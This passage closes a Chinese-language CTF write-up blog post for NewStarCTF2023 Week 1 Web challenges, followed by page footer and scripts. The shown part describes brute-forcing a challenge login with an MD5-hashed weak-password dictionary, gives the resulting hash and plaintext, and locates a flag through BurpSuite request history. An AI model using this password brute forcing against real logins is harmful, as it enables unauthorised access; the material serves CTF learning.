+<p><img loading="lazy" src="C:%5cUsers%5calext%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20231003104724610.png" srcset="C:%5cUsers%5calext%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20231003104724610.png?size=small, C:%5cUsers%5calext%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20231003104724610.png?size=medium 1.5x, C:%5cUsers%5calext%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20231003104724610.png?size=large 2x" sizes="auto" data-title="C:\Users\alext\AppData\Roaming\Typora\typora-user-images\image-20231003104724610.png" data-alt="C:\Users\alext\AppData\Roaming\Typora\typora-user-images\image-20231003104724610.png" class="suffix-invalid" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>这里payload使用弱密码字典，但是记得使用md5加密。</p>
+<p>爆破结果如下，找到字节数和其他的结果不同的结果就是答案：</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231003105048454.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231003105048454.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231003105048454.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231003105048454.png?size=large 2x" sizes="auto" data-title="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231003105048454.png" data-alt="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231003105048454.png" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>答案就是670b14728ad9902aecba32e22fa4f6bd（解密后是000000）。</p>
+<p>这里登录后，在终端中CTRL-D退出终端，寻找历史记录，提示使用BurpSuite。</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231003105231688.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231003105231688.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231003105231688.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231003105231688.png?size=large 2x" sizes="auto" data-title="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231003105231688.png" data-alt="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231003105231688.png" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>于是使用burpsuite。直接抓包发现没有什么信息。但是http请求记录里面有一个可疑点：</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231003105340181.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231003105340181.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231003105340181.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231003105340181.png?size=large 2x" sizes="auto" data-title="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231003105340181.png" data-alt="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231003105340181.png" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>进去查看返回包就发现flag。</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231003105414680.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231003105414680.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231003105414680.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231003105414680.png?size=large 2x" sizes="auto" data-title="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231003105414680.png" data-alt="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231003105414680.png" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>Web完结。</p>
+</div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="更新于 2023-10-02 10:41:00">更新于 2023-10-02&nbsp;</span>
+      </div><div class="post-info-license">
+          <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span>
+        </div></div>
+    <div class="post-info-line">
+      <div class="post-info-md"><span><a href="/articles/2023/10/newstarctf2023-week1-web/index.md" title="阅读原始文档" class="link-to-markdown">阅读原始文档</a></span></div>
+      <div class="post-info-share">
+        <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="https://alextang.top/articles/2023/10/newstarctf2023-week1-web/" data-title="NewStarCTF2023-Week1-Web" data-via="a1extang" data-hashtags="Web,CTF,WriteUp"><i class="fa-brands fa-twitter fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="https://alextang.top/articles/2023/10/newstarctf2023-week1-web/" data-hashtag="Web"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="https://alextang.top/articles/2023/10/newstarctf2023-week1-web/" data-title="NewStarCTF2023-Week1-Web"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
+  </span>
+      </div>
+    </div>
+  </div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href='/tags/web/' class="post-tag">Web</a><a href='/tags/ctf/' class="post-tag">CTF</a><a href='/tags/writeup/' class="post-tag">WriteUp</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav"><a href="/articles/2023/09/re-or-pwn/" class="post-nav-item" rel="prev" title="NISACTF 2022 ReorPwn?"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>NISACTF 2022 ReorPwn?</a>
+      <a href="/articles/2023/10/newstarctf2023-week1-pwn/" class="post-nav-item" rel="next" title="NewStarCTF2023-Week1-Pwn">NewStarCTF2023-Week1-Pwn<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2024</span><span class="author" itemprop="copyrightHolder">
+              <a href="/">alextang</a></span><span class="license footer-divider"><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div><div class="footer-line statistics"></div><div class="footer-line visitor">
+          <span id="busuanzi_container_site_uv" title='总访客数'><i class="fa-regular fa-user fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='总访问量'><i class="fa-regular fa-eye fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
+        </div><div class="footer-line beian"><span class="icp footer-divider"><a href="https://icp.gov.moe/?keyword=20238299" target="_blank">萌ICP备20238299号</a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
+        </div></div><div id="mask"></div><noscript>
+    <div class="noscript-warning">FixIt 主题在启用 JavaScript 的情况下效果最佳。</div>
+  </noscript>
+</div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css"><script src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js" defer></script><script src="/lib/lunr/lunr.stemmer.support.min.js" defer></script><script src="/lib/lunr/lunr.zh.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js" async defer></script><script src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/auto-render.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/copy-tex.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/mhchem.min.js" defer></script><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async defer></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","editLockTitle":"锁定可编辑代码块","editUnLockTitle":"解锁可编辑代码块","editable":true,"maxShownLines":10},"comment":{"enable":false},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"lunr"}};</script><script src="/js/theme.min.js" defer></script></body>
+</html>
